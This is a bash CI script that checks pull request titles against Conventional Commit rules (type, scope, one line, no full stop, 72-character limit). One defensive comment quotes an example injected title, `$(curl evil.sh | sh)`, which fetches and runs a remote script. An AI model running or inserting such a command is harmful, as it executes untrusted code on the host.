#!/usr/bin/env bash
# CI check: the pull request title is a Conventional Commit, because a squash merge turns it
# into the commit on main (docs/devops/git-workflow.md).
# The title arrives in PR_TITLE from the workflow's env, never pasted into the script with
# ${{ }}: anyone can name a pull request `$(curl evil.sh | sh)` (script injection).
# Locally: PR_TITLE='ci: add x' scripts/ci/check-pr-title.sh
set -uo pipefail

title=${PR_TITLE-}
format='^(feat|fix|docs|test|refactor|perf|build|ci|chore)(\([a-z0-9-]+\))?!?: [a-z]'
problems=()

if [[ $title == *$'\n'* ]]; then
  problems+=('it must be one line')
fi
if ! [[ $title =~ $format ]]; then
  problems+=('it must start with a known type, an optional lowercase (scope), an optional !, then ": " and a lowercase letter')
fi
if [[ $title == *. ]]; then
  problems+=('it must not end with a full stop')
fi
# Dependabot writes its own titles ("ci: bump <action> from X to Y in the actions group"),
# which can pass 72 characters; only the length rule is waived for it.
if ((${#title} > 72)) && [[ ${PR_AUTHOR-} != 'dependabot[bot]' ]]; then
  problems+=("it has ${#title} characters; the most is 72")
fi

if ((${#problems[@]} == 0)); then
  echo 'PR title OK'
  exit 0
fi
printf 'PR title is not a Conventional Commit: %s\n' "$title"
printf ' - %s\n' "${problems[@]}"
echo 'Types: feat fix docs test refactor perf build ci chore. Example: fix(gst): round cgst and sgst separately'
echo 'Rename the pull request; this check runs again by itself.'
exit 1
